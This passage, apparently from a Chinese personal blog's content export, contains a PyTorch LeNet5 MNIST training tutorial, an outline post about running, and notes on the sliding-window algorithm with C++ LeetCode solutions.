punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#16  10*10</span>            nn<span class="token punctuation">.</span>Tanh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#激活函数</span>            nn<span class="token punctuation">.</span>AvgPool2d<span class="token punctuation">(</span>kernel_size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>stride<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>padding<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 16 5*5</span>        <span class="token punctuation">)</span>                self<span class="token punctuation">.</span>layer3<span class="token operator">=</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>            nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span>in_channels<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span>out_channels<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>kernel_size<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#120 1*1</span>        <span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#nn.Linear()：用于设置网络中的全连接层，需要注意的是全连接层的输入与输出都是二维张量</span>        self<span class="token punctuation">.</span>layer4<span class="token operator">=</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>in_features<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">,</span>out_features<span class="token operator">=</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            nn<span class="token punctuation">.</span>Tanh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>in_features<span class="token operator">=</span><span class="token number">84</span><span class="token punctuation">,</span> out_features<span class="token operator">=</span>output<span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 前向传播</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>layer1<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>layer2<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>layer3<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> torch<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span>input<span class="token operator">=</span>x<span class="token punctuation">,</span> start_dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 把120个输出拼接出来</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>layer4<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x      </code></pre><blockquote><p>3.数据下载和预处理</p></blockquote><pre class=" language-python"><code class="language-python">device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cpu</span>transform <span class="token operator">=</span> transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0.5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>train_set <span class="token operator">=</span> mnist<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span><span class="token string">"./mnist_data"</span><span class="token punctuation">,</span> train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> transform<span class="token operator">=</span>transform<span class="token punctuation">)</span>test_set <span class="token operator">=</span> mnist<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span><span class="token string">"./mnist_data"</span><span class="token punctuation">,</span> train<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> transform<span class="token operator">=</span>transform<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>train_set<span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>test_set<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#结果 60000 10000</span>train_batch_size <span class="token operator">=</span> <span class="token number">300</span>test_batch_size <span class="token operator">=</span> <span class="token number">50</span>train_loader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>train_set<span class="token punctuation">,</span> batch_size<span class="token operator">=</span>train_batch_size<span class="token punctuation">,</span> shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>test_loader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>test_set<span class="token punctuation">,</span> batch_size<span class="token operator">=</span>test_batch_size<span class="token punctuation">,</span> shuffle<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><blockquote><ol start="4"><li>查看部分数据</li></ol></blockquote><pre class=" language-python"><code class="language-python">examples <span class="token operator">=</span> enumerate<span class="token punctuation">(</span>test_loader<span class="token punctuation">)</span>batch_idex<span class="token punctuation">,</span> <span class="token punctuation">(</span>example_data<span class="token punctuation">,</span> example_label<span class="token punctuation">)</span> <span class="token operator">=</span> next<span class="token punctuation">(</span>examples<span class="token punctuation">)</span>sample_set <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>example_data<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>sample_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Truth: &amp;#123;&amp;#125;"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>example_label<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="../../../../../11345/AppData/Roaming/Typora/typora-user-images/image-20221027135830388.png" alt="image-20221027135830388"></p><blockquote><p>5.模型参数</p></blockquote><pre class=" language-python"><code class="language-python">model <span class="token operator">=</span> LeNet5<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>lr <span class="token operator">=</span> <span class="token number">0.3</span><span class="token comment" spellcheck="true">#学习率</span>num_epoches <span class="token operator">=</span> <span class="token number">100</span><span class="token comment" spellcheck="true"># 迭代次数</span>momentum <span class="token operator">=</span> <span class="token number">0.8</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 交叉熵</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span>lr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#优化器选择sgd</span>scheduler <span class="token operator">=</span> torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>lr_scheduler<span class="token punctuation">.</span>ExponentialLR<span class="token punctuation">(</span>optimizer<span class="token punctuation">,</span> gamma<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 自动调节学习率</span></code></pre><blockquote><p>6.开始训练模型</p></blockquote><pre class=" language-python"><code class="language-python">eval_losses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>eval_acces <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> epoch <span class="token keyword">in</span> range<span class="token punctuation">(</span>num_epoches<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#     if epoch % 5 == 0:</span><span class="token comment" spellcheck="true">#         optimizer.param_groups[0]['lr'] *= 0.1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"学习率lr："</span><span class="token punctuation">,</span>optimizer<span class="token punctuation">.</span>param_groups<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># print("优化器中参数：",optimizer.param_groups)</span>    model<span class="token punctuation">.</span>train<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> imgs<span class="token punctuation">,</span> labels <span class="token keyword">in</span> train_loader<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># print(imgs,labels)</span>        imgs<span class="token punctuation">,</span> labels <span class="token operator">=</span> imgs<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">,</span> labels<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        predict <span class="token operator">=</span> model<span class="token punctuation">(</span>imgs<span class="token punctuation">)</span>        loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>predict<span class="token punctuation">,</span> labels<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># back propagation</span>        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 疑问 1为啥每次都要把梯度清零</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    scheduler<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    eval_loss <span class="token operator">=</span> <span class="token number">0</span>    eval_acc <span class="token operator">=</span> <span class="token number">0</span>    model<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> imgs<span class="token punctuation">,</span> labels <span class="token keyword">in</span> test_loader<span class="token punctuation">:</span>        imgs<span class="token punctuation">,</span> labels <span class="token operator">=</span> imgs<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">,</span> labels<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        predict <span class="token operator">=</span> model<span class="token punctuation">(</span>imgs<span class="token punctuation">)</span>        loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>predict<span class="token punctuation">,</span> labels<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># record loss</span>        eval_loss <span class="token operator">+=</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># record accurate rate</span>        result <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>predict<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        acc_num <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> labels<span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        acc_rate <span class="token operator">=</span> acc_num <span class="token operator">/</span> imgs<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        eval_acc <span class="token operator">+=</span> acc_rate    eval_losses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>eval_loss <span class="token operator">/</span> len<span class="token punctuation">(</span>test_loader<span class="token punctuation">)</span><span class="token punctuation">)</span>    eval_acces<span class="token punctuation">.</span>append<span class="token punctuation">(</span>eval_acc <span class="token operator">/</span> len<span class="token punctuation">(</span>test_loader<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'epoch: &amp;#123;&amp;#125;'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'loss： &amp;#123;&amp;#125;'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>eval_loss <span class="token operator">/</span> len<span class="token punctuation">(</span>test_loader<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'accurate rate: &amp;#123;&amp;#125;'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>eval_acc <span class="token operator">/</span> len<span class="token punctuation">(</span>test_loader<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></code></pre><blockquote><p>7.tanh激活下的损失和准确图像</p></blockquote><pre class=" language-python"><code class="language-python">plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'evaluation loss'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>len<span class="token punctuation">(</span>eval_losses<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> eval_losses<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155801.png" alt="loss"></p><pre class=" language-python"><code class="language-python">plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'evaluation acc'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>len<span class="token punctuation">(</span>eval_acces<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> eval_acces<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155808.png" alt="acc"></p><h2 id="6-CNN-发展"><a href="#6-CNN-发展" class="headerlink" title="6.CNN 发展"></a>6.CNN 发展</h2><h3 id="1-ALeNet"><a href="#1-ALeNet" class="headerlink" title="1.ALeNet"></a>1.ALeNet</h3><h3 id="2-VGG"><a href="#2-VGG" class="headerlink" title="2.VGG"></a>2.VGG</h3><h3 id="3-GooGLenet"><a href="#3-GooGLenet" class="headerlink" title="3.GooGLenet"></a>3.GooGLenet</h3><h3 id="4-ResNet"><a href="#4-ResNet" class="headerlink" title="4.ResNet"></a>4.ResNet</h3><p>参考链接：</p><p><a href="https://blog.csdn.net/weixin_44944722/article/details/126713365">(19条消息) 经典卷积神经网络模型 - ResNet_WBZhang2022的博客-CSDN博客_resnet卷积</a></p><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h2><h3 id="1-视频参考"><a href="#1-视频参考" class="headerlink" title="1.视频参考"></a>1.视频参考</h3><blockquote><p>动画讲解</p></blockquote><p><a href="https://www.bilibili.com/video/BV1R5411w715/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道 08】走进”卷积神经网络”，了解图像识别背后的原理_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1fY411H7g8/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【卷积神经网络】8分钟搞懂CNN，动画讲解喜闻乐见_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1oL411t72z/?spm_id_from=333.788.recommend_more_video.1&vd_source=5e8f069711510b3788382a0a03ff38e5">从图像识别走进卷积神经网络——可能是全网最通俗易懂的深度学习课程_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1VV411478E/?spm_id_from=333.788.recommend_more_video.1">从“卷积”、到“图像卷积操作”、再到“卷积神经网络”，“卷积”意义的3次改变_哔哩哔哩_bilibili</a></p><blockquote><p>CNN 模型可视化网站</p></blockquote><p><a href="https://poloclub.github.io/cnn-explainer/#article-pooling">CNN Explainer (poloclub.github.io)</a></p><p>激活函数 可视化调参</p><p><a href="http://playground.tensorflow.org/#activation=relu&batchSize=10&dataset=xor&regDataset=reg-plane&learningRate=0.03&regularizationRate=0&noise=10&networkShape=4,5,3,2&seed=0.87043&showTestData=false&discretize=false&percTrainData=90&x=true&y=true&xTimesY=true&xSquared=false&ySquared=false&cosX=false&sinX=false&cosY=false&sinY=false&collectStats=false&problem=classification&initZero=false&hideText=false">A Neural Network Playground (tensorflow.org)</a></p><blockquote><p> 理论视频讲解</p></blockquote><p><a href="https://www.bilibili.com/video/BV1MS4y1b7DU/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">卷积神经网络原理 - 01 - 表示学习_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1L64y1m7Nh/?spm_id_from=333.999.0.0">19 卷积层【动手学深度学习v2】_哔哩哔哩_bilibili</a></p><h3 id="2-博客参考链接"><a href="#2-博客参考链接" class="headerlink" title="2.博客参考链接"></a>2.博客参考链接</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跑步</title>
      <link href="/2022/10/22/%E8%B7%91%E6%AD%A5/"/>
      <url>/2022/10/22/%E8%B7%91%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="跑步相关知识"><a href="#跑步相关知识" class="headerlink" title="跑步相关知识"></a>跑步相关知识</h1><h2 id="1-跑步姿势"><a href="#1-跑步姿势" class="headerlink" title="1.跑步姿势"></a>1.跑步姿势</h2><h3 id="1-前脚掌"><a href="#1-前脚掌" class="headerlink" title="1.前脚掌"></a>1.前脚掌</h3><h3 id="2-后脚掌"><a href="#2-后脚掌" class="headerlink" title="2. 后脚掌"></a>2. 后脚掌</h3><h3 id="3-错误-“刹车效应”"><a href="#3-错误-“刹车效应”" class="headerlink" title="3.错误 “刹车效应”"></a>3.错误 “刹车效应”</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="2-鞋子挑选"><a href="#2-鞋子挑选" class="headerlink" title="2.鞋子挑选"></a>2.鞋子挑选</h2><h3 id="3-不正确的跑步"><a href="#3-不正确的跑步" class="headerlink" title="3.不正确的跑步"></a>3.不正确的跑步</h3><h3 id="1-心率"><a href="#1-心率" class="headerlink" title="1.心率"></a>1.心率</h3><h3 id="2-膝盖"><a href="#2-膝盖" class="headerlink" title="2.膝盖"></a>2.膝盖</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滑动窗口</title>
      <link href="/2022/10/22/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
      <url>/2022/10/22/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><blockquote><p>窗口概念</p></blockquote><p>假设target是9，我们的脑海中可以快速的浮现出一个从1到9的数组。这时候不妨再想象一下，<strong>数组下方有个两个指针</strong>，一个<strong>指向1，一个指向5</strong>，<strong>两个指针形成的这个数组范围</strong>，就是所谓的<strong>窗口</strong>。如下图所示：</p><p><img src="https://pic.leetcode-cn.com/b7bbf8306beaf1f05af3f46d33846a9f54543d74894ddcf81bf3e1e712dbabce-image.png" alt="image.png"></p><blockquote><p>滑动概念</p></blockquote><p><strong>左右指针通过平移，会改变了窗口的范围，从而引起窗口的滑动，这就是所谓的滑动窗口</strong></p><p><img src="https://pic.leetcode-cn.com/652fac6fe71a55076fad3550487de0574616521e0e7ea93d96e0694f0afda358-image.png" alt="image.png"></p><p>参考链接：<a href="https://leetcode.cn/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/solution/xiang-jie-hua-dong-chuang-kou-fa-qiu-gen-fa-jian-g/">【详解】滑动窗口法 -&gt; 求根法 -&gt; 间隔法，一山还有一山高 - 和为s的连续正数序列 - 力扣（LeetCode）</a></p><blockquote><p>重要性质</p></blockquote><p>滑动窗口的重要性质是：<strong>窗口的左边界和右边界永远只能向右移动，而不能向左移</strong>动。这是为了<strong>保证滑动窗口的时间复杂度是 O(n)。</strong>如果<strong>左右边界向左移动的话，这叫做“回溯”</strong>，算法的**时间复杂度就可能不止 O(n)**。</p><blockquote><p>解决问题</p></blockquote><ol><li>数组类的滑动窗口问题<br>🅰️ 长度最小的子数组<br>🅰️ 滑动窗口的最大值<br>🅰️<strong>和为s的连续正数序列</strong><br>🅰️<a href="https://leetcode.cn/problems/maximum-average-subarray-i/">子数组最大平均数</a><br>上面的每一种题目，相对于字符串的问题来说更加简单，有时候甚至不需要进行哈希集合的定义，而只需要进行简单的这个左右指针的移动，维护好窗口就行。</li><li>字符串类的滑动窗口问题<br>这类问题一般可以分为两类，单个字符串；两个字符串。两个字符串当中又可以按照连续序列与非连续序列进行划分。<br>对于两个字符串而言，一般是一个字符串作为母体，另一个字符串作为比较。<br>举几个力扣中题目的例子：<br>🅰️字符串的最小覆盖字串（非连续序列）<br>🅰️字符串的排列（连续序列）<br>🅰️字符串的所有字母异位词（连续序列）<br>🅰️无重复字符的最长子串（单个字符串）<br>🅰️最多包含连个重复字符的最长字串<br>🅰️最多包含k个重复字符的最长字串<br>以字符串的最小覆盖字串题目为例</li></ol><p><code>具体的问题：求解满足某种条件的某段连续区间的最短或最长子序列（一般为子数组、子字符串等）。</code></p><p>参考链接：<a href="https://blog.csdn.net/cillian_bao/article/details/124509130">(19条消息) 滑动窗口详解_cillian_bao的博客-CSDN博客_滑动窗口</a></p><h2 id="2-模板总结"><a href="#2-模板总结" class="headerlink" title="2.模板总结"></a>2.模板总结</h2><h3 id="1-最长问题"><a href="#1-最长问题" class="headerlink" title="1. 最长问题"></a>1. 最长问题</h3><pre class=" language-c++"><code class="language-c++">//最长最大模板初始化left,right,result,bestResultwhile (右指针没有到结尾)&#123;     窗口扩大，加入right对应元素，更新当前result     while (result不满足要求)&#123;// 不满足条件时候，left右移动           窗口缩小，移除left对应元素           left右移     &#125;     更新最优结果bestResult         right++&#125;返回bestResult</code></pre><h3 id="2-最短问题"><a href="#2-最短问题" class="headerlink" title="2. 最短问题"></a>2. 最短问题</h3><pre class=" language-c++"><code class="language-c++">//最短最小模板初始化left,right,result,bestResultwhile (右指针没有到结尾)&#123;     窗口扩大，加入right对应元素，更新当前result     while (result满足要求)&#123; //满足条件时候，left右移动          更新最优结果bestResult          窗口缩小，移除left对应元素          left右移     &#125;     right++&#125;返回bestResult</code></pre><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/477097574">力扣笔记-python-滑动窗口 - 知乎 (zhihu.com)</a></p><h2 id="3-固定窗口大小"><a href="#3-固定窗口大小" class="headerlink" title="3.固定窗口大小"></a>3.固定窗口大小</h2><h3 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="209. 长度最小的子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度最小的子数组</a></h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给定一个含有 n 个正整数的数组和一个正整数 target 。找出该数组中满足其和 ≥ target 的长度最小的 连续子数组 [numsl, numsl+1, ..., numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/minimum-size-subarray-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：target = 7, nums = [2,3,1,2,4,3]输出：2解释：子数组 [4,3] 是该条件下的长度最小的子数组。示例 2：输入：target = 4, nums = [1,4,4]输出：1示例 3：输入：target = 11, nums = [1,1,1,1,1,1,1,1]输出：0 提示：1 <= target <= 1091 <= nums.length <= 1051 <= nums[i] <= 105 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/minimum-size-subarray-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解一 暴力法</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int minSubArrayLen(int target, vector<int>& nums) &#123;        int i,j;        int length=nums.size()-1;//length为数组长度-1，即遍历的索引范围        int sum,subLength=0;//sum:子序列的和,subLength:子序列的长度        int result = INT32_MAX; // 最终的结果        for(i=0;i<=length;i++)&#123;//设置子序列的起始位置 为i            sum=0;            for(j=i;j<=length;j++)&#123;//设置子序列的终止位置 为j                sum+=nums[j];                if(sum>=target)&#123;//一旦发现子序列和超过target，便更新                    subLength=j-i+1;//取子序列的长度                    result=result>subLength? subLength:result;//和之前相比较取最小。                    break;//找到符合条件所以停止                &#125;            &#125;        &#125;        //如果result没有赋值，说明没有符合的存在返回0，否则返回本身        return result==INT32_MAX?0:result;    &#125;&#125;;</code></pre><pre class=" language-c++"><code class="language-c++">复杂度分析时间复杂度：O(n^2) 双层for循环类似于 排序。空间复杂度：O(1)</code></pre><p>时间复杂度参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI0NjAxMDU5NA==&mid=2475918746&idx=1&sn=3fe42234a1f07fb084d11fe06fb24893&chksm=ff22e217c8556b019b9052f9d4805174385ba4c8c099216fa226dbd1b033a9a49782579e4b75&scene=21#wechat_redirect">保姆级教学！彻底学会时间复杂度和空间复杂度 (qq.com)</a></p><blockquote><p>题解二 滑动窗口</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int minSubArrayLen(int target, vector<int>& nums) &#123;        int i=0,j;//i滑动窗口的起始位置，j滑动窗口的终止位置        int length=nums.size()-1;//length为数组长度-1，即遍历的索引范围        int sum=0,subLength=0;//sum:滑动窗口数值之和,subLength:滑动窗口的长度        int result = INT32_MAX; // 最终的结果        /*        解释一下滑动窗口 2次循环为啥 时间复杂度为0(n)        首先最外层的for循环  j变量遍历一次数组长度        最里层的while循环  i变量遍历一次数组长度        双指针 可以把双层for循环 改成单循环：类似于快慢指针一样        因此准确来说是：2*n           滑动窗口 类似于暴力破解的反向：恰恰因为此把原有的双层for：改变成单层的for        时间复杂度优化了下来                */        for(j=0;j<=length;j++)&#123;//设置子序列的终止位置 为j            sum+=nums[j];//不断更新，知到找到符合位置            while(sum>=target)&#123;//发现符合位置：不断更改滑动窗口的起始位置                subLength=j-i+1;                result=result>subLength?subLength:result;                sum-=nums[i];                i++;            &#125;        &#125;        //如果result没有赋值，说明没有符合的存在返回0，否则返回本身        return result==INT32_MAX?0:result;    &#125;&#125;;</code></pre><pre class=" language-c++"><code class="language-c++">复杂度分析时间复杂度：O(n)，其中 n是数组的长度。指针 start 和 end 最多各移动 nn 次。空间复杂度：O(1)作者：LeetCode-Solution链接：https://leetcode.cn/problems/minimum-size-subarray-sum/solution/chang-du-zui-xiao-de-zi-shu-zu-by-leetcode-solutio/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h3 id="904-水果成篮"><a href="#904-水果成篮" class="headerlink" title="904. 水果成篮"></a><a href="https://leetcode.cn/problems/fruit-into-baskets/">904. 水果成篮</a></h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">你正在探访一家农场，农场从左到右种植了一排果树。这些树用一个整数数组 fruits 表示，其中 fruits[i] 是第 i 棵树上的水果 种类 。你想要尽可能多地收集水果。然而，农场的主人设定了一些严格的规矩，你必须按照要求采摘水果：你只有 两个 篮子，并且每个篮子只能装 单一类型 的水果。每个篮子能够装的水果总量没有限制。你可以选择任意一棵树开始采摘，你必须从 每棵 树（包括开始采摘的树）上 恰好摘一个水果 